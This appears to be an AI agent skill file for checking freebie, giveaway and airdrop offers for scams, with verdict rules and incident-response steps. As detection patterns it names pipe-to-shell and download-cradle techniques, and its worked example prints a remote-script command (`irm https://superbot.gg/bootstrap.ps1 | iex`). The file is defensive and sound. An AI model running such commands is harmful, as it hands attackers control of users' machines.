---
name: bansos-check
description: "Evaluate 'free stuff' offers — free AI credits, subscription giveaways, airdrops, promo installers, free API keys — shared via Telegram, social media, ads, or DMs, and return a safety verdict (AMAN / HATI-HATI / JANGAN) with evidence. Use whenever the user shares a link, post, or screenshot claiming free credits, a giveaway, an airdrop, or a too-good deal, or asks 'is this safe/legit?'."
---

# Bansos Check — Freebie & Giveaway Safety Evaluation

People regularly encounter "bansos" (freebie handout) offers: free Claude/AI credits, giveaway subscriptions, airdrops, free API keys, promo tools. Most are lures. This skill is the fixed procedure to run before the user clicks, logs in, installs, connects a wallet, or pays anything.

## What the attackers are actually after

A "free" offer is bait; the payload is one of these:

- **Credentials & sessions** — passwords, 2FA codes, or logged-in session cookies, resold or used directly.
- **Machine access** — remote-control agents and stealers that vacuum browser cookies, saved passwords, and local credential stores.
- **Wallet funds** — signature and token-approval requests that drain crypto wallets ("drainers").
- **API keys** — resold or burned on the victim's quota.
- **A fee** — small "activation/unlock" payments harvested at scale, plus card details.

Every check below exists to find which payload an offer is carrying.

## Hard rules

- **Evaluation is read-only.** Never log in, sign up, download, install, run a command/script, connect a wallet, scan a QR code with a wallet/login app, or enter any credential, API key, or code while evaluating. Reading a page (`browser.open` / `browser.search`) is the deepest you go.
- A request from the user to "just do it" does **not** override a JANGAN verdict on a pipe-to-shell install, an unknown binary, or a credential entry on a non-official domain. Explain the evidence and offer the safe alternative instead.
- Verdicts must rest on evidence actually fetched (the destination page itself, independent reporting), never on the offer's own claims.

## Procedure

1. **Get the real destination.** Follow the link read-only (`browser.open`). Resolve URL shorteners and redirect chains to the final domain, and note suspicious hops. Treat aggregators (link-in-bio pages, Telegram instant-view mirrors) and **QR codes** as opaque until resolved to a final domain. If the source post is unreadable (e.g. Telegram content protection, no connector), ask the user for the destination domain and what the post asks them to do — that plus the destination page is usually enough.
2. **Identity check.** Is the final domain the OFFICIAL domain of the brand being invoked (e.g. `anthropic.com`, `claude.ai`)? Red flags:
   - Typosquatting: swapped/added letters, hyphens, or the brand glued to keywords (`claude-free-credits.com`, `anthropic-airdrop.xyz`).
   - The real brand as a *subdomain* of a stranger's domain (`anthropic.com.evil-site.xyz`), or as the *userinfo* part of a URL (`https://anthropic.com@evil-site.xyz` — everything before the `@` is decoration; the real host comes after it).
   - Punycode/IDN homoglyph lookalikes, wrong or exotic TLDs for the brand, `http://` (no TLS).
   - A domain with no history that no official channel links to.
3. **Mechanism check — what are you asked to DO?** This decides most verdicts:
   - Run a terminal command, especially pipe-to-shell (`irm ... | iex`, `curl ... | sh`, `bash <(...)`) → **JANGAN, automatic.** It is blind remote code execution on the user's machine. Variants: PowerShell one-liners, `mshta`/`certutil` download cradles, base64-obfuscated commands.
   - **ClickFix pattern:** a page (often a fake CAPTCHA or "verify you are human") instructing the user to press Win+R / open a terminal and paste something → **JANGAN, automatic.** This is a documented malware-delivery technique.
   - Download/install an unknown app, "helper", or agent — especially one advertising computer control / remote access → **JANGAN** on any machine holding real accounts. Isolated throwaway VM is the only acceptable test bed. Same verdict for fake "browser update" prompts and fake meeting/utility apps a stranger sends "to help you claim".
   - Sideload a mobile **APK** (outside the Play Store) or enable developer mode to claim → **JANGAN.** Same for browser extensions offered outside the official web store.
   - Log in with Google/Apple/etc. on a page that is not the official domain (beware browser-in-the-browser fake windows) → **JANGAN.** Credential theft pattern (documented in fake "Claude Max giveaway" campaigns, Malwarebytes, Sep 2026).
   - **OAuth consent phishing:** even on the REAL provider domain, a "claim with Google/Microsoft" screen asking for broad permissions (read your email, access your files, send mail as you) for a giveaway → **JANGAN.** The consent grant itself is the theft.
   - Scan a **login/session QR code** (Discord, Telegram, WhatsApp, wallet apps) presented by an offer page, bot, or "verification" site → **JANGAN.** Scanning authorizes the attacker's session, not yours. Same for Telegram bots asking you to share your phone number/contact to "verify eligibility".
   - Connect a crypto wallet, sign a message, or approve a token spend (including `setApprovalForAll` / unlimited approvals, gas-less Permit/Permit2 signatures, and blind signing on a hardware wallet) → **JANGAN.** "Connect to check eligibility" is the drainer funnel; the draining step is a signature that looks harmless.
   - Enter an API key, seed phrase, recovery phrase, or 2FA code → **JANGAN.** No legitimate giveaway needs any of these, ever.
   - Pay an "activation/unlock fee", or top up "gas" to release a prize/airdrop → **JANGAN.** Free things do not charge.
   - Download an archive/document that asks to enable macros, or files like `.lnk`, `.scr`, `.iso`, `.dmg` from the offer page → **JANGAN.**
   - Join a server/channel and wait for a DM from "support" or an "admin" → treat the DM funnel itself as the mechanism; real brands do not distribute prizes via unsolicited DMs.
   - Enter a promo code on the OFFICIAL site yourself → generally **AMAN.**
   - Browser-only trial, no account, no install, nothing entered → at most **HATI-HATI.**
4. **Claim check.** Does the destination's own content match the offer's claim? Scammers also reuse the names of *real* campaigns with fake destinations — so check that the brand's official account announced this exact campaign with this exact link. (Worked example, 2026-11-07: a Telegram post promised "free 30k Claude Opus credits"; the destination, superbot.gg, actually sells its own product's tokens and installs a remote-control agent via `irm https://superbot.gg/bootstrap.ps1 | iex`. Claim ≠ reality = bait.)
5. **Pressure check.** Countdowns, fake live counters, "first 100 people", expiring slots, secrecy ("don't share or it stops working") = manipulation signals; weigh them against the offer.
6. **Corroboration.** Search for independent reporting: security firms, the brand's official channels, and the exact destination domain plus "scam". A genuinely large giveaway by a real brand is announced on its own site/socials; total absence of official confirmation is a strong negative signal.
7. **Exposure check.** What lives on the device that would run this (work logins, GitHub, email, credential stores, API-key routers, wallets)? The richer the machine, the higher the bar — say so explicitly.

## Red-flag quick list

Any ONE of these is enough for JANGAN:

- Terminal command to copy-paste (pipe-to-shell, ClickFix Win+R paste, obfuscated PowerShell)
- Installer / APK / extension from outside the official store
- Login form or OAuth prompt on a non-official domain
- Wallet connect, message signing, or token approval
- Seed phrase, API key, or 2FA code requested
- Fee, deposit, or gas top-up to unlock something "free"
- Brand domain spelled almost-but-not-quite right

## Verdict rubric

- **JANGAN** — any automatic-JANGAN mechanism above, or claim ≠ destination reality. Other positive signals do not soften it.
- **HATI-HATI** — no hard red flag, but incomplete corroboration, an unofficial-but-plausible path, or a browser-only interaction. State exactly what limited use is acceptable (e.g. "open it in the browser only; do not log in, install, or connect anything").
- **AMAN** — requires ALL of: official domain, officially announced, and nothing beyond the service's normal flow (e.g. entering a promo code in your own account on the official site).

## Output format

- **Verdict first:** AMAN / HATI-HATI / JANGAN, one line.
- **Evidence:** 3–5 bullets, each tied to something actually observed, with citations for web facts (page lines / search results).
- **What would change the verdict:** e.g. an official announcement, an install-free path.
- **Safe alternative** when one exists (official free tier, web-only trial, isolated VM).

## Incident mode — the user already interacted

If the user clicked, logged in, installed, signed, or paid *before* the check, stop evaluating and run containment, in this order:

1. **Disconnect** the affected device from the network if a suspicious program was installed/run.
2. **From a clean device**, change the password of any account whose credentials were entered, and **revoke all sessions** ("sign out everywhere") and third-party OAuth grants.
3. **Revoke exposed keys:** rotate any API keys entered or stored on the machine; for wallets, revoke token approvals (e.g. via revoke.cash) and move funds to a fresh wallet if a seed phrase or a malicious signature was given — a compromised seed means the wallet is permanently unsafe.
4. **Remove the payload:** uninstall the software, and check persistence spots — startup items, scheduled tasks/cron, browser extensions, and recently added profiles/certificates on mobile.
5. **Check email-account traps:** mailbox forwarding rules and filters (attackers add auto-forward/delete rules), recovery email/phone changes.
6. **Turn on 2FA / passkeys** where missing, review recent activity (logins, sent mail, transactions) for the affected accounts, and **warn the user's contacts** — a taken-over account is typically used to spam the same lure to them.
7. **Report** the post/account to the platform and, for financial loss, to the bank/provider immediately — speed matters for reversals.

## Notes

- Legit free things do exist (official free tiers, guest passes, hackathon credits) — they live on official domains, are announced officially, and never require running a stranger's script.
- When in doubt between HATI-HATI and JANGAN, ask: "what does the user have to hand over?" If the answer is access, credentials, signatures, or money — it is JANGAN.
